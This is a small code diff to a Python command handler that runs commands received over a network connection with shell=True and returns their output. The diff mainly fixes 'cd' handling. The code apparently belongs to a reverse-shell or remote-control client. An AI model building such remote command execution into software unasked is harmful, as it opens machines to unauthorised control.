@@ -64,9 +64,12 @@ def execute_command(command,connection):
         connection.close()
         
     if command[:2] == 'cd':
-            os.chdir(command[3:])
+            os.chdir(os.path.abspath(command[3:]))
+            output_str = "Command Exectuted Successfully." + '\n'
+            currentWD = os.getcwd() + "> " 
+            connection.send(str.encode( currentWD + output_str ))
 
-    if len(command) > 0:
+    elif len(command) > 0:
         cmd = subprocess.Popen(command[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
         output_byte = cmd.stdout.read() + cmd.stderr.read() # output and error messages
         output_str = str(output_byte,"utf-8") or "Command Exectuted Successfully."
